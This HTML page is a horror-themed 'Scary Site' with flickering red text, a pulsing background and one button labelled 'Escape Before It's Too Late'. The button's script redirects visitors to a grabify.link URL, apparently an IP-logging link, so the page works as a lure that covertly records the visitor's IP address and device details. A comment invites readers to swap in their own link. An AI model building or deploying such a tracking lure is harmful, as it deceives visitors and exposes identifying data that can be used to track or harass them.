<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Scary Site</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background: black;
      color: red;
      font-family: 'Courier New', Courier, monospace;
      text-align: center;
      overflow: hidden;
    }

    h1 {
      font-size: 4rem;
      animation: flicker 1.5s infinite;
      text-shadow: 0 0 10px red, 0 0 20px crimson, 0 0 30px darkred;
    }

    @keyframes flicker {
      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
        opacity: 1;
      }
      20%, 24%, 55% {
        opacity: 0;
      }
    }

    .background {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      background: url('https://images.unsplash.com/photo-1558864555-d24204288c28') center/cover no-repeat;
      filter: brightness(20%) grayscale(80%);
      animation: pulse 5s infinite;
    }

    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
        filter: brightness(20%) grayscale(80%);
      }
      50% {
        transform: scale(1.05);
        filter: brightness(10%) grayscale(100%);
      }
    }

    .button {
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 1.2rem;
      color: black;
      background: red;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: transform 0.2s, background 0.2s;
    }

    .button:hover {
      transform: scale(1.1);
      background: darkred;
    }
  </style>
</head>
<body>
  <div class="background"></div>
  <h1>You are not alone...</h1>
  <button class="button" onclick="redirect()">Escape Before It's Too Late</button>

  <script>
    function redirect() {
      window.location.href = "https://grabify.link/SGHZ5R"; // Replace with your redirect link
    }
  </script>
</body>
</html>
